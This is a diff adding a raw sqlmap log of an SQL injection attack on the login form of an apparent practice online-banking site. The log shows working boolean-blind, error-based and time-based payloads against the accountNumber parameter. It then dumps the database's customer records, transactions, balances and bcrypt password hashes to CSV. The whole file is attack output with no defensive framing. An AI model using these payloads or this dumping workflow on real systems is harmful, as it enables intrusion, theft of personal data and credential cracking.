@@ -1,0 +1,299 @@
+[11:52:25] [INFO] parsing HTTP request from 'test.req'
+[11:52:26] [WARNING] provided value for parameter 'submit' is empty. Please, always use only valid parameter values so sqlmap could be able to run properly
+[11:52:26] [INFO] resuming back-end DBMS 'mysql' 
+[11:52:26] [INFO] testing connection to the target URL
+got a 302 redirect to 'https://onlinebank.ocbcyber.xyz/pages/login.php?msg=Account number does not exist'. Do you want to follow? [Y/n] Y
+redirect is a result of a POST request. Do you want to resend original POST data to a new location? [Y/n] Y
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: accountNumber (POST)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
+    Payload: accountNumber=1244' OR NOT 6317=6317#&password=admin&submit=
+
+    Type: error-based
+    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
+    Payload: accountNumber=1244' AND GTID_SUBSET(CONCAT(0x71706a6b71,(SELECT (ELT(9223=9223,1))),0x716a6a7071),9223)-- XzCH&password=admin&submit=
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: accountNumber=1244' AND (SELECT 9494 FROM (SELECT(SLEEP(5)))CCQz)-- SNbL&password=admin&submit=
+---
+[11:52:30] [INFO] the back-end DBMS is MySQL
+back-end DBMS: MySQL >= 5.6
+[11:52:30] [INFO] fetching tables for database: 'bank'
+[11:52:32] [INFO] retrieved: 'balance'
+[11:52:33] [INFO] retrieved: 'credentials'
+[11:52:34] [INFO] retrieved: 'transactions'
+[11:52:35] [INFO] retrieved: 'userinfo'
+[11:52:35] [INFO] fetching columns for table 'userinfo' in database 'bank'
+[11:52:37] [INFO] retrieved: 'AccNo'
+[11:52:38] [INFO] retrieved: 'int'
+[11:52:39] [INFO] retrieved: 'Address'
+[11:52:40] [INFO] retrieved: 'varchar(100)'
+[11:52:41] [INFO] retrieved: 'Email'
+[11:52:42] [INFO] retrieved: 'varchar(64)'
+[11:52:43] [INFO] retrieved: 'Name'
+[11:52:44] [INFO] retrieved: 'varchar(50)'
+[11:52:44] [INFO] fetching entries for table 'userinfo' in database 'bank'
+[11:52:47] [INFO] retrieved: '197'
+[11:52:48] [INFO] retrieved: 'Syanjga'
+[11:52:49] [INFO] retrieved: 'ram@bahadur.com'
+[11:52:50] [INFO] retrieved: 'Ram Bahadur'
+[11:52:51] [INFO] retrieved: '198'
+[11:52:52] [INFO] retrieved: 'Jhapa'
+[11:52:54] [INFO] retrieved: 'haha@bahadur.com'
+[11:52:55] [INFO] retrieved: 'Jaja Bahadur'
+[11:52:56] [INFO] retrieved: '199'
+[11:52:56] [INFO] retrieved: 'Dhanghadi'
+[11:52:57] [INFO] retrieved: 'dam@bahadur.com'
+[11:52:58] [INFO] retrieved: 'Dam Bahadur'
+[11:53:00] [INFO] retrieved: '200'
+[11:53:01] [INFO] retrieved: 'Pokhara'
+[11:53:02] [INFO] retrieved: 'sangam@adhikari.com'
+[11:53:03] [INFO] retrieved: 'Sangam Adhikari'
+Database: bank
+Table: userinfo
+[4 entries]
++-------+---------------------+-----------------+-----------+
+| AccNo | Email               | Name            | Address   |
++-------+---------------------+-----------------+-----------+
+| 197   | ram@bahadur.com     | Ram Bahadur     | Syanjga   |
+| 198   | haha@bahadur.com    | Jaja Bahadur    | Jhapa     |
+| 199   | dam@bahadur.com     | Dam Bahadur     | Dhanghadi |
+| 200   | sangam@adhikari.com | Sangam Adhikari | Pokhara   |
++-------+---------------------+-----------------+-----------+
+
+[11:53:03] [INFO] table 'bank.userinfo' dumped to CSV file '/home/mazimba/.local/share/sqlmap/output/onlinebank.ocbcyber.xyz/dump/bank/userinfo.csv'
+[11:53:03] [INFO] fetching columns for table 'transactions' in database 'bank'
+[11:53:05] [INFO] retrieved: 'Amount'
+[11:53:07] [INFO] retrieved: 'decimal(10,0)'
+[11:53:07] [INFO] retrieved: 'Date'
+[11:53:08] [INFO] retrieved: 'date'
+[11:53:09] [INFO] retrieved: 'DateTime'
+[11:53:10] [INFO] retrieved: 'datetime'
+[11:53:11] [INFO] retrieved: 'RecBalance'
+[11:53:12] [INFO] retrieved: 'decimal(10,0)'
+[11:53:13] [INFO] retrieved: 'Receiver'
+[11:53:14] [INFO] retrieved: 'int'
+[11:53:15] [INFO] retrieved: 'Remarks'
+[11:53:16] [INFO] retrieved: 'varchar(50)'
+[11:53:17] [INFO] retrieved: 'SenBalance'
+[11:53:18] [INFO] retrieved: 'decimal(10,0)'
+[11:53:19] [INFO] retrieved: 'Sender'
+[11:53:20] [INFO] retrieved: 'int'
+[11:53:21] [INFO] retrieved: 'Time'
+[11:53:22] [INFO] retrieved: 'time'
+[11:53:22] [INFO] fetching entries for table 'transactions' in database 'bank'
+[11:53:33] [INFO] retrieved: '4'
+[11:53:34] [INFO] retrieved: '33'
+[11:53:35] [INFO] retrieved: '197'
+[11:53:36] [INFO] retrieved: 'All remaining Bal'
+[11:53:37] [INFO] retrieved: '5'
+[11:53:38] [INFO] retrieved: '198'
+[11:53:39] [INFO] retrieved: '2024-07-21 16:18:15'
+[11:53:40] [INFO] retrieved: '2024-01-28'
+[11:53:41] [INFO] retrieved: '22:13:47'
+[11:53:42] [INFO] retrieved: '10'
+[11:53:43] [INFO] retrieved: '79'
+[11:53:44] [INFO] retrieved: '197'
+[11:53:45] [INFO] retrieved: 'Hired as Accountant'
+[11:53:46] [INFO] retrieved: '59'
+[11:53:47] [INFO] retrieved: '200'
+[11:53:48] [INFO] retrieved: '2024-07-21 16:18:15'
+[11:53:49] [INFO] retrieved: '2024-01-28'
+[11:53:51] [INFO] retrieved: '15:46:17'
+[11:53:52] [INFO] retrieved: '10'
+[11:53:53] [INFO] retrieved: '79'
+[11:53:54] [INFO] retrieved: '198'
+[11:53:55] [INFO] retrieved: 'Hired as Sales Manager'
+[11:53:56] [INFO] retrieved: '49'
+[11:53:57] [INFO] retrieved: '200'
+[11:53:57] [INFO] retrieved: '2024-07-21 16:18:15'
+[11:53:58] [INFO] retrieved: '2024-01-28'
+[11:53:59] [INFO] retrieved: '15:47:02'
+[11:54:00] [INFO] retrieved: '10'
+[11:54:01] [INFO] retrieved: '29'
+[11:54:02] [INFO] retrieved: '197'
+[11:54:03] [INFO] retrieved: 'Tax Cuts'
+[11:54:04] [INFO] retrieved: '200'
+[11:54:05] [INFO] retrieved: '200'
+[11:54:06] [INFO] retrieved: '2024-07-21 16:18:15'
+[11:54:07] [INFO] retrieved: '2024-01-28'
+[11:54:08] [INFO] retrieved: '15:54:24'
+[11:54:09] [INFO] retrieved: '10'
+[11:54:10] [INFO] retrieved: '79'
+[11:54:10] [INFO] retrieved: '197'
+[11:54:11] [INFO] retrieved: 'Hired as Accountant'
+[11:54:13] [INFO] retrieved: '59'
+[11:54:14] [INFO] retrieved: '200'
+[11:54:15] [INFO] retrieved: '2024-07-21 16:18:15'
+[11:54:15] [INFO] retrieved: '2024-01-28'
+[11:54:16] [INFO] retrieved: '15:46:17'
+[11:54:17] [INFO] retrieved: '19'
+[11:54:18] [INFO] retrieved: '118'
+[11:54:19] [INFO] retrieved: '199'
+[11:54:20] [INFO] retrieved: 'Investment'
+[11:54:21] [INFO] retrieved: '0'
+[11:54:22] [INFO] retrieved: '200'
+[11:54:23] [INFO] retrieved: '2024-07-21 16:18:15'
+[11:54:24] [INFO] retrieved: '2024-01-28'
+[11:54:25] [INFO] retrieved: '15:48:40'
+[11:54:26] [INFO] retrieved: '20'
+[11:54:27] [INFO] retrieved: '30'
+[11:54:28] [INFO] retrieved: '200'
+[11:54:29] [INFO] retrieved: 'Advetisers Payout'
+[11:54:30] [INFO] retrieved: '68'
+[11:54:31] [INFO] retrieved: '199'
+[11:54:32] [INFO] retrieved: '2024-07-21 16:18:15'
+[11:54:33] [INFO] retrieved: '2024-01-28'
+[11:54:34] [INFO] retrieved: '15:51:14'
+[11:54:35] [INFO] retrieved: '30'
+[11:54:36] [INFO] retrieved: '99'
+[11:54:37] [INFO] retrieved: '199'
+[11:54:38] [INFO] retrieved: 'Hired as Operation Manager'
+[11:54:39] [INFO] retrieved: '19'
+[11:54:40] [INFO] retrieved: '200'
+[11:54:41] [INFO] retrieved: '2024-07-21 16:18:15'
+[11:54:43] [INFO] retrieved: '2024-01-28'
+[11:54:44] [INFO] retrieved: '15:47:37'
+[11:54:45] [INFO] retrieved: '30'
+[11:54:46] [INFO] retrieved: '139'
+[11:54:47] [INFO] retrieved: '197'
+[11:54:48] [INFO] retrieved: 'Miscellaneous Costs'
+[11:54:49] [INFO] retrieved: '9'
+[11:54:50] [INFO] retrieved: '198'
+[11:54:51] [INFO] retrieved: '2024-07-21 16:18:15'
+[11:54:52] [INFO] retrieved: '2024-01-28'
+[11:54:53] [INFO] retrieved: '15:50:22'
+[11:54:54] [INFO] retrieved: '30'
+[11:54:55] [INFO] retrieved: '169'
+[11:54:56] [INFO] retrieved: '197'
+[11:54:57] [INFO] retrieved: 'Sales Income'
+[11:54:58] [INFO] retrieved: '88'
+[11:55:00] [INFO] retrieved: '199'
+[11:55:01] [INFO] retrieved: '2024-07-21 16:18:15'
+[11:55:02] [INFO] retrieved: '2024-01-28'
+[11:55:03] [INFO] retrieved: '15:50:47'
+[11:55:04] [INFO] retrieved: '30'
+[11:55:05] [INFO] retrieved: '210'
+[11:55:06] [INFO] retrieved: '200'
+[11:55:07] [INFO] retrieved: 'Providers Funding'
+[11:55:08] [INFO] retrieved: '38'
+[11:55:09] [INFO] retrieved: '199'
+[11:55:10] [INFO] retrieved: '2024-07-21 16:18:15'
+[11:55:11] [INFO] retrieved: '2024-01-28'
+[11:55:13] [INFO] retrieved: '15:52:40'
+[11:55:14] [INFO] retrieved: '40'
+[11:55:15] [INFO] retrieved: '109'
+[11:55:16] [INFO] retrieved: '197'
+[11:55:17] [INFO] retrieved: 'ROI Again'
+[11:55:18] [INFO] retrieved: '39'
+[11:55:19] [INFO] retrieved: '198'
+[11:55:20] [INFO] retrieved: '2024-07-21 16:18:15'
+[11:55:21] [INFO] retrieved: '2024-01-28'
+[11:55:22] [INFO] retrieved: '15:50:00'
+[11:55:23] [INFO] retrieved: '50'
+[11:55:24] [INFO] retrieved: '180'
+[11:55:25] [INFO] retrieved: '200'
+[11:55:26] [INFO] retrieved: 'More Sales'
+[11:55:27] [INFO] retrieved: '19'
+[11:55:28] [INFO] retrieved: '197'
+[11:55:29] [INFO] retrieved: '2024-07-21 16:18:15'
+[11:55:30] [INFO] retrieved: '2024-01-28'
+[11:55:31] [INFO] retrieved: '15:51:55'
+[11:55:32] [INFO] retrieved: '100'
+[11:55:33] [INFO] retrieved: '130'
+[11:55:34] [INFO] retrieved: '200'
+[11:55:35] [INFO] retrieved: 'Regular Income now'
+[11:55:36] [INFO] retrieved: '69'
+[11:55:37] [INFO] retrieved: '197'
+[11:55:38] [INFO] retrieved: '2024-07-21 16:18:15'
+[11:55:39] [INFO] retrieved: '2024-01-28'
+[11:55:40] [INFO] retrieved: '15:51:36'
+Database: bank
+Table: transactions
+[14 entries]
++--------+--------+------------+----------+----------------------------+----------+------------+------------+---------------------+
+| Amount | Sender | Date       | Time     | Remarks                    | Receiver | RecBalance | SenBalance | DateTime            |
++--------+--------+------------+----------+----------------------------+----------+------------+------------+---------------------+
+| 4      | 198    | 2024-01-28 | 22:13:47 | All remaining Bal          | 197      | 33         | 5          | 2024-07-21 16:18:15 |
+| 10     | 200    | 2024-01-28 | 15:46:17 | Hired as Accountant        | 197      | 79         | 59         | 2024-07-21 16:18:15 |
+| 10     | 200    | 2024-01-28 | 15:47:02 | Hired as Sales Manager     | 198      | 79         | 49         | 2024-07-21 16:18:15 |
+| 10     | 200    | 2024-01-28 | 15:54:24 | Tax Cuts                   | 197      | 29         | 200        | 2024-07-21 16:18:15 |
+| 10     | 200    | 2024-01-28 | 15:46:17 | Hired as Accountant        | 197      | 79         | 59         | 2024-07-21 16:18:15 |
+| 19     | 200    | 2024-01-28 | 15:48:40 | Investment                 | 199      | 118        | 0          | 2024-07-21 16:18:15 |
+| 20     | 199    | 2024-01-28 | 15:51:14 | Advetisers Payout          | 200      | 30         | 68         | 2024-07-21 16:18:15 |
+| 30     | 200    | 2024-01-28 | 15:47:37 | Hired as Operation Manager | 199      | 99         | 19         | 2024-07-21 16:18:15 |
+| 30     | 198    | 2024-01-28 | 15:50:22 | Miscellaneous Costs        | 197      | 139        | 9          | 2024-07-21 16:18:15 |
+| 30     | 199    | 2024-01-28 | 15:50:47 | Sales Income               | 197      | 169        | 88         | 2024-07-21 16:18:15 |
+| 30     | 199    | 2024-01-28 | 15:52:40 | Providers Funding          | 200      | 210        | 38         | 2024-07-21 16:18:15 |
+| 40     | 198    | 2024-01-28 | 15:50:00 | ROI Again                  | 197      | 109        | 39         | 2024-07-21 16:18:15 |
+| 50     | 197    | 2024-01-28 | 15:51:55 | More Sales                 | 200      | 180        | 19         | 2024-07-21 16:18:15 |
+| 100    | 197    | 2024-01-28 | 15:51:36 | Regular Income now         | 200      | 130        | 69         | 2024-07-21 16:18:15 |
++--------+--------+------------+----------+----------------------------+----------+------------+------------+---------------------+
+
+[11:55:40] [INFO] table 'bank.transactions' dumped to CSV file '/home/mazimba/.local/share/sqlmap/output/onlinebank.ocbcyber.xyz/dump/bank/transactions.csv'
+[11:55:40] [INFO] fetching columns for table 'balance' in database 'bank'
+[11:55:42] [INFO] retrieved: 'AccNo'
+[11:55:43] [INFO] retrieved: 'int'
+[11:55:44] [INFO] retrieved: 'Balance'
+[11:55:45] [INFO] retrieved: 'decimal(15,0)'
+[11:55:46] [INFO] retrieved: 'Interest'
+[11:55:47] [INFO] retrieved: 'decimal(15,0)'
+[11:55:47] [INFO] fetching entries for table 'balance' in database 'bank'
+[11:55:49] [INFO] retrieved: '197'
+[11:55:50] [INFO] retrieved: '35'
+[11:55:51] [INFO] retrieved: '2'
+[11:55:52] [INFO] retrieved: '198'
+[11:55:53] [INFO] retrieved: '5'
+[11:55:54] [INFO] retrieved: '0'
+[11:55:55] [INFO] retrieved: '199'
+[11:55:56] [INFO] retrieved: '40'
+[11:55:57] [INFO] retrieved: '2'
+[11:55:58] [INFO] retrieved: '200'
+[11:55:59] [INFO] retrieved: '212'
+[11:56:00] [INFO] retrieved: '12'
+Database: bank
+Table: balance
+[4 entries]
++-------+---------+----------+
+| AccNo | Balance | Interest |
++-------+---------+----------+
+| 197   | 35      | 2        |
+| 198   | 5       | 0        |
+| 199   | 40      | 2        |
+| 200   | 212     | 12       |
++-------+---------+----------+
+
+[11:56:00] [INFO] table 'bank.balance' dumped to CSV file '/home/mazimba/.local/share/sqlmap/output/onlinebank.ocbcyber.xyz/dump/bank/balance.csv'
+[11:56:00] [INFO] fetching columns for table 'credentials' in database 'bank'
+[11:56:01] [INFO] retrieved: 'AccNo'
+[11:56:02] [INFO] retrieved: 'int'
+[11:56:03] [INFO] retrieved: 'Pass'
+[11:56:04] [INFO] retrieved: 'varchar(100)'
+[11:56:04] [INFO] fetching entries for table 'credentials' in database 'bank'
+[11:56:06] [INFO] retrieved: '197'
+[11:56:07] [INFO] retrieved: '$2y$10$7IIfksddC.juTraxmYGTceLp.81mwMB2e2NOBB9YZy.ii9oY1Li8W'
+[11:56:08] [INFO] retrieved: '200'
+[11:56:09] [INFO] retrieved: '$2y$10$dop1oPiHyey.V.86PakZCuDrZbgOCtOqRDOE8vT3.U4Of4RpeIqXS'
+[11:56:10] [INFO] retrieved: '199'
+[11:56:11] [INFO] retrieved: '$2y$10$h6Eq4XrzBTudR7Vo2fZ/IemkyV8DgPPfe.CBv0UI1Bbm.kJOYfeYi'
+[11:56:12] [INFO] retrieved: '198'
+[11:56:13] [INFO] retrieved: '$2y$10$TJGtCn8Nd4ZHng8OY/K1LODLWd3SMnbXjIlzHo8vjPy5pGK6qocPO'
+Database: bank
+Table: credentials
+[4 entries]
++--------------------------------------------------------------+-------+
+| Pass                                                         | AccNo |
++--------------------------------------------------------------+-------+
+| $2y$10$7IIfksddC.juTraxmYGTceLp.81mwMB2e2NOBB9YZy.ii9oY1Li8W | 197   |
+| $2y$10$dop1oPiHyey.V.86PakZCuDrZbgOCtOqRDOE8vT3.U4Of4RpeIqXS | 200   |
+| $2y$10$h6Eq4XrzBTudR7Vo2fZ/IemkyV8DgPPfe.CBv0UI1Bbm.kJOYfeYi | 199   |
+| $2y$10$TJGtCn8Nd4ZHng8OY/K1LODLWd3SMnbXjIlzHo8vjPy5pGK6qocPO | 198   |
++--------------------------------------------------------------+-------+
+
+[11:56:13] [INFO] table 'bank.credentials' dumped to CSV file '/home/mazimba/.local/share/sqlmap/output/onlinebank.ocbcyber.xyz/dump/bank/credentials.csv'
+[11:56:13] [INFO] fetched data logged to text files under '/home/mazimba/.local/share/sqlmap/output/onlinebank.ocbcyber.xyz'
+
+[*] ending @ 11:56:13 /2024-07-29/
